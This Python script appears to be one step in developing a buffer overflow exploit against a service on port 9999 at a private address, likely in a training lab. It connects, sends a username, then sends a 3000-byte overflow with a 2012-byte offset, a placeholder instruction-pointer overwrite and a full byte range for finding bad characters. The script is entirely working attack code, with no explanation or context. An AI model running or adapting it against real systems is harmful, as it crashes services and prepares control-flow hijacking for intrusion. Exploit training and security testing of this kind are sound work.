import socket, struct



host, port = '192.168.1.93', 9999
bad_chars = [


]
all_chars = bytearray(range(1,256))

for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

username = b'Generic User'
next_prompt = b'\r\n'
new_eip = b'BBBB'
length = 3000
offset = 2012
payload = b''.join([
b'A'*offset,
new_eip,
all_chars,
b'C' * (length - offset - len(new_eip) - len(all_chars))
])




with socket.socket() as s:
        s.connect((host,port))
        s.recv(1024)
        s.send(username + next_prompt)
        s.recv(1024)
        s.send(payload + next_prompt)
